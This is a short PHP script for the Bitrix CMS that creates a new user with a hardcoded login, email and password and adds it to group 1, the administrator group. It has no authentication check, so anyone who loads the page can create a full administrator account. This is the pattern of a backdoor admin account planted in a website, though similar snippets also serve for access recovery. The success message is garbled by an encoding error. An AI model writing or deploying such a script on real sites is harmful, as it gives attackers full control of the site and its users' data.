<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$newlogin = 'SuperUserSuperUser123';
$newemail = 'SuperUserSuperUser123@gmail.com';
$newpassword = '40883316';
$group = array(1);
 
$user = new CUser;
$arFields = array(
  "EMAIL"             => $newemail,
  "LOGIN"             => $newlogin,
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => $group,
  "PASSWORD"          => $newpassword,
  "CONFIRM_PASSWORD"  => $newpassword
);
 
$ID = $user->Add($arFields);
if(intval($ID) > 0) echo '������������� ������';
else echo $user->LAST_ERROR;
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
?>